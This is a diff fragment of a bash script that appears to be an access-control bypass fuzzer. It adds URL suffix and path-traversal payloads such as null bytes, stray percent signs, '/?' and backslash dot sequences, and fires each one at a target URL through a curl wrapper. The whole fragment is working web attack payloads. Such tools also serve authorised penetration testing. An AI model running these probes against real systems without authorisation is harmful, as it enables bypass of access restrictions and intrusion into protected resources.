@@ -70,13 +70,18 @@ function payload_Suffux(){
 	output "${1}%2f" $(curl_wapper "${1}%2f")
 	output "${1}.json" $(curl_wapper "${1}.json")
 	output "${1}%23" $(curl_wapper "${1}%23")
+	output "${1}%00" $(curl_wapper "${1}%00")
 	output "${1}..;/" $(curl_wapper "${1}..;/")
+	output "${1}%" $(curl_wapper "${1}%")
 	output "${1}?" $(curl_wapper "${1}?")
 	output "${1}??" $(curl_wapper "${1}??")
 
 	output "${1}/*" $(curl_wapper "${1}/*")
 	output "${1}/;" $(curl_wapper "${1}/;")
 	output "${1}/%3f" $(curl_wapper "${1}/%3f")
+	output "${1}/%" $(curl_wapper "${1}/%")
+	output "${1}/?" $(curl_wapper "${1}/?")
+	output "${1}/%00" $(curl_wapper "${1}/%00")
 	output "${1}/??" $(curl_wapper "${1}/??")
 	output "${1}/%20" $(curl_wapper "${1}/%20")
 	output "${1}/%F3%A0%81%A9" $(curl_wapper "${1}/%F3%A0%81%A9")
@@ -93,6 +98,7 @@ function payload_Suffux(){
 	output "${1}//" $(curl_wapper "${1}//")
 	output "${1}/./" $(curl_wapper "${1}/./")
 	output "${1}/../" $(curl_wapper "${1}/../")
+	output "${1}\..\.\\" $(curl_wapper "${1}\..\.\\")
 	output "${1}/%2e%2e/" $(curl_wapper "${1}/%2e%2e/")
 	output "${1}/%2e%2e%2f" $(curl_wapper "${1}/%2e%2e%2f")
 
@@ -118,6 +124,7 @@ function payload_Between(){
 	output "${1}/.%2f${2}" $(curl_wapper "${1}/.%2f${2}")
 	output "${1}/%2f${2}" $(curl_wapper "${1}/%2f${2}")
 	output "${1}//${2}" $(curl_wapper "${1}//${2}")
+	output "${1}\..\.\\\\${2}" $(curl_wapper "${1}\..\.\\${2}")
 }
 
 function payload_Header(){
